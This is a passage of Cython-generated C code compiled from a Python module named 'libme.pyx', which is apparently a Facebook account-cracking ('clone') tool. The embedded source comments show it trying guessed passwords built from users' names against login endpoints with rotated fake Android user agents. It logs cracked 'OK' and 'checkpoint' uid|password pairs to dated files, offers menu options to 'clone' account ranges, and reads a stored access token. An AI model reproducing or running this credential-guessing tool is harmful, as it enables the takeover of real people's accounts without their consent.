    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
      if (likely(__pyx_t_8)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
        __Pyx_INCREF(__pyx_t_8);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_6, function);
      }
    }
    __pyx_t_4 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 837, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_keys); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 837, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_6);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_6, function);
      }
    }
    __pyx_t_7 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 837, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_17 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_checkpoint, __pyx_t_7, Py_EQ)); if (unlikely(__pyx_t_17 < 0)) __PYX_ERR(0, 837, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_18 = (__pyx_t_17 != 0);
    if (__pyx_t_18) {

      /* "libme.pyx":838
 * 				break
 * 			elif "checkpoint" in ses.cookies.get_dict().keys():
 * 				print("\r  \033[1;91m ~> %s|%s\033[0;97m        "%(uid, pw))             # <<<<<<<<<<<<<<
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 */
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 838, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_6 = __Pyx_PyString_Format(__pyx_kp_s_1_91m_s_s_0_97m, __pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 838, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_6) < 0) __PYX_ERR(0, 838, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      /* "libme.pyx":839
 * 			elif "checkpoint" in ses.cookies.get_dict().keys():
 * 				print("\r  \033[1;91m ~> %s|%s\033[0;97m        "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 */
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 839, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 839, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_4 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 839, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_20 = __Pyx_PyObject_Append(__pyx_t_6, __pyx_t_4); if (unlikely(__pyx_t_20 == ((int)-1))) __PYX_ERR(0, 839, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "libme.pyx":840
 * 				print("\r  \033[1;91m ~> %s|%s\033[0;97m        "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				break
 * 			else:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_date); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 840, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = __Pyx_PyString_FormatSafe(__pyx_kp_s_CP_s_txt, __pyx_t_6); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 840, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 840, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_7);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_7);
      __Pyx_INCREF(__pyx_n_s_a);
      __Pyx_GIVEREF(__pyx_n_s_a);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_n_s_a);
      __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_6, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 840, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_write); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 840, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 840, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 840, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_7, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_8);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 840, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      /* "libme.pyx":841
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break             # <<<<<<<<<<<<<<
 * 			else:
 * 				continue
 */
      goto __pyx_L4_break;

      /* "libme.pyx":837
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 * 			elif "checkpoint" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
 * 				print("\r  \033[1;91m ~> %s|%s\033[0;97m        "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 */
    }

    /* "libme.pyx":843
 * 				break
 * 			else:
 * 				continue             # <<<<<<<<<<<<<<
 * 
 * 		self.loop+=1
 */
    /*else*/ {
      goto __pyx_L3_continue;
    }

    /* "libme.pyx":816
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 * 		for pw in pwx:             # <<<<<<<<<<<<<<
 * 			kwargs = {}
 * 			pw = pw.lower()
 */
    __pyx_L3_continue:;
  }
  __pyx_L4_break:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":845
 * 				continue
 * 
 * 		self.loop+=1             # <<<<<<<<<<<<<<
 * 	def __33__3__(self):
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 */
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 845, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 845, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_loop, __pyx_t_4) < 0) __PYX_ERR(0, 845, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":799
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__file__, uid, pwx)
 * 	def __file__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_AddTraceback("libme.James.__file__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_host);
  __Pyx_XDECREF(__pyx_v_pw);
  __Pyx_XDECREF(__pyx_v_kwargs);
  __Pyx_XDECREF(__pyx_v_ses);
  __Pyx_XDECREF(__pyx_v_p);
  __Pyx_XDECREF(__pyx_v_b);
  __Pyx_XDECREF(__pyx_v_bl);
  __Pyx_XDECREF(__pyx_v_i);
  __Pyx_XDECREF(__pyx_v_gaaa);
  __Pyx_XDECREF(__pyx_v_kuki);
  __Pyx_XDECREF(__pyx_v_key);
  __Pyx_XDECREF(__pyx_v_value);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":846
 * 
 * 		self.loop+=1
 * 	def __33__3__(self):             # <<<<<<<<<<<<<<
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 * 		print("  [2] Clone All in one Account")
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_53__33__3__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_53__33__3__ = {"__33__3__", (PyCFunction)__pyx_pw_5libme_5James_53__33__3__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_53__33__3__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__33__3__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_52__33__3__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_52__33__3__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v___33__33__ = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  int __pyx_t_2;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__33__3__", 0);

  /* "libme.pyx":847
 * 		self.loop+=1
 * 	def __33__3__(self):
 * 		print("\n  [1] Clone only 100074 & 100075 account")             # <<<<<<<<<<<<<<
 * 		print("  [2] Clone All in one Account")
 * 		print("  [3] Clone using file path")
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_1_Clone_only_100074_100075_acco) < 0) __PYX_ERR(0, 847, __pyx_L1_error)

  /* "libme.pyx":848
 * 	def __33__3__(self):
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 * 		print("  [2] Clone All in one Account")             # <<<<<<<<<<<<<<
 * 		print("  [3] Clone using file path")
 * 		__33__33__ = input("\n  [] Select One : ")
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_2_Clone_All_in_one_Account) < 0) __PYX_ERR(0, 848, __pyx_L1_error)

  /* "libme.pyx":849
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 * 		print("  [2] Clone All in one Account")
 * 		print("  [3] Clone using file path")             # <<<<<<<<<<<<<<
 * 		__33__33__ = input("\n  [] Select One : ")
 * 		if __33__33__ == "":
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_3_Clone_using_file_path) < 0) __PYX_ERR(0, 849, __pyx_L1_error)

  /* "libme.pyx":850
 * 		print("  [2] Clone All in one Account")
 * 		print("  [3] Clone using file path")
 * 		__33__33__ = input("\n  [] Select One : ")             # <<<<<<<<<<<<<<
 * 		if __33__33__ == "":
 * 			self.menu_file()
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 850, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v___33__33__ = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":851
 * 		print("  [3] Clone using file path")
 * 		__33__33__ = input("\n  [] Select One : ")
 * 		if __33__33__ == "":             # <<<<<<<<<<<<<<
 * 			self.menu_file()
 * 		elif __33__33__ == "1":
 */
  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v___33__33__, __pyx_kp_s_, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 851, __pyx_L1_error)
  if (__pyx_t_2) {

    /* "libme.pyx":852
 * 		__33__33__ = input("\n  [] Select One : ")
 * 		if __33__33__ == "":
 * 			self.menu_file()             # <<<<<<<<<<<<<<
 * 		elif __33__33__ == "1":
 * 			self.__100__07__()
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_menu_file); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 852, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 852, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":851
 * 		print("  [3] Clone using file path")
 * 		__33__33__ = input("\n  [] Select One : ")
 * 		if __33__33__ == "":             # <<<<<<<<<<<<<<
 * 			self.menu_file()
 * 		elif __33__33__ == "1":
 */
    goto __pyx_L3;
  }

  /* "libme.pyx":853
 * 		if __33__33__ == "":
 * 			self.menu_file()
 * 		elif __33__33__ == "1":             # <<<<<<<<<<<<<<
 * 			self.__100__07__()
 * 			self.__100__00__()
 */
  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v___33__33__, __pyx_kp_s_1, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 853, __pyx_L1_error)
  if (__pyx_t_2) {

    /* "libme.pyx":854
 * 			self.menu_file()
 * 		elif __33__33__ == "1":
 * 			self.__100__07__()             # <<<<<<<<<<<<<<
 * 			self.__100__00__()
 * 		elif __33__33__ == "2":
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_100__07); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 854, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 854, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":855
 * 		elif __33__33__ == "1":
 * 			self.__100__07__()
 * 			self.__100__00__()             # <<<<<<<<<<<<<<
 * 		elif __33__33__ == "2":
 * 			self.__ma___sal2__()
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_100__00); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 855, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 855, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":853
 * 		if __33__33__ == "":
 * 			self.menu_file()
 * 		elif __33__33__ == "1":             # <<<<<<<<<<<<<<
 * 			self.__100__07__()
 * 			self.__100__00__()
 */
    goto __pyx_L3;
  }

  /* "libme.pyx":856
 * 			self.__100__07__()
 * 			self.__100__00__()
 * 		elif __33__33__ == "2":             # <<<<<<<<<<<<<<
 * 			self.__ma___sal2__()
 * 			self.__Fr__rr__()
 */
  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v___33__33__, __pyx_kp_s_2, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 856, __pyx_L1_error)
  if (__pyx_t_2) {

    /* "libme.pyx":857
 * 			self.__100__00__()
 * 		elif __33__33__ == "2":
 * 			self.__ma___sal2__()             # <<<<<<<<<<<<<<
 * 			self.__Fr__rr__()
 * 		elif __33__33__ == "3":
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ma___sal2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 857, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 857, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":858
 * 		elif __33__33__ == "2":
 * 			self.__ma___sal2__()
 * 			self.__Fr__rr__()             # <<<<<<<<<<<<<<
 * 		elif __33__33__ == "3":
 * 			self.__me__nnn__()
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_Fr__rr); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 858, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 858, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":856
 * 			self.__100__07__()
 * 			self.__100__00__()
 * 		elif __33__33__ == "2":             # <<<<<<<<<<<<<<
 * 			self.__ma___sal2__()
 * 			self.__Fr__rr__()
 */
    goto __pyx_L3;
  }

  /* "libme.pyx":859
 * 			self.__ma___sal2__()
 * 			self.__Fr__rr__()
 * 		elif __33__33__ == "3":             # <<<<<<<<<<<<<<
 * 			self.__me__nnn__()
 * 	def __100__07__(self):
 */
  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v___33__33__, __pyx_kp_s_3, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 859, __pyx_L1_error)
  if (__pyx_t_2) {

    /* "libme.pyx":860
 * 			self.__Fr__rr__()
 * 		elif __33__33__ == "3":
 * 			self.__me__nnn__()             # <<<<<<<<<<<<<<
 * 	def __100__07__(self):
 * 		try:
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_me__nnn); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 860, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_4)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_4);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 860, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "libme.pyx":859
 * 			self.__ma___sal2__()
 * 			self.__Fr__rr__()
 * 		elif __33__33__ == "3":             # <<<<<<<<<<<<<<
 * 			self.__me__nnn__()
 * 	def __100__07__(self):
 */
  }
  __pyx_L3:;

  /* "libme.pyx":846
 * 
 * 		self.loop+=1
 * 	def __33__3__(self):             # <<<<<<<<<<<<<<
 * 		print("\n  [1] Clone only 100074 & 100075 account")
 * 		print("  [2] Clone All in one Account")
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("libme.James.__33__3__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v___33__33__);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":861
 * 		elif __33__33__ == "3":
 * 			self.__me__nnn__()
 * 	def __100__07__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token =open('login.txt', 'r').read()
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_55__100__07__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_55__100__07__ = {"__100__07__", (PyCFunction)__pyx_pw_5libme_5James_55__100__07__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_55__100__07__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__100__07__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_54__100__07__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

